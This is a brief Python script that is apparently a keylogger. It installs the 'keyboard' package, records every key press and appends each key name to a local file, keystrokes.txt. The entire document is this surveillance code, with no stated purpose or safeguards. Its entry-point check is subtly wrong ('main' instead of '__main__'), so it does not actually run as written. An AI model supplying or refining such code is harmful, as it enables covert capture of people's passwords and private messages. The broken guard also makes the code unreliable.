import subprocess

log_file = 'keystrokes.txt'
dependencies = ['keyboard']

def install_dependencies(dependencies):
    for package in dependencies:
        subprocess.run(['pip', 'install', package], check=True)


def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))


def run():
    import keyboard

    keyboard.on_press(on_key_press)
    keyboard.wait()

if __name__ == "main":
    install_dependencies(dependencies)
    run()
